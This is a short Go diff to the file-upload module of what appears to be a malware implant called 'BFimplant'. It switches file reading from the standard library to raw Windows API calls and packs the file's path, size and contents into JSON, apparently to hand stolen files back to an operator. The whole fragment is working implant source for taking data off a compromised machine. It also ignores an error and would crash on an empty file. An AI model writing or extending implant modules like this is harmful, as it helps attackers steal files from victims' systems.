@@ -3,7 +3,9 @@ package modules
 import (
 	"encoding/json"
 	"fmt"
-	"os"
+	"BFimplant/winapiV2"
+	"syscall"
+
 )
 
 type UploadModule struct{}
@@ -17,14 +19,30 @@ func (m *UploadModule) Name() string {
 }
 
 func (m *UploadModule) Execute(filePath string,data []byte) (string, error) {
-	b, err := os.ReadFile(filePath)
+
+	// open a file handel
+	fileHandle, err := winapiV2.CreateFile(syscall.StringToUTF16Ptr(filePath), winapiV2.GENERIC_READ, 0, nil, winapiV2.OPEN_EXISTING, winapiV2.FILE_ATTRIBUTE_NORMAL, 0)
 	if err != nil {
-		fmt.Println("Error reading file:", err)
+		fmt.Println("Error creating a handel to the file:", err)
 		return "", err
 	}
+
+	//get file size
+	fileSize, _ := winapiV2.GetFileSize(fileHandle, nil)
+
+	// read the file
+	b := make([]byte, int(fileSize))
+	var bread uint32
+
+	succ, err := winapiV2.ReadFile(fileHandle, &b[0] ,uint32(len(b)), &bread, nil)
+	if !succ {
+		fmt.Println("Error reading file:", err )
+		return "", err
+	}
+
 	osInfo := map[string]interface{}{
 		"file_path": filePath,
-		"file_size": len(b),
+		"file_size": bread,
 		"file_data": b,
 	}
 	file_data, err := json.Marshal(osInfo)
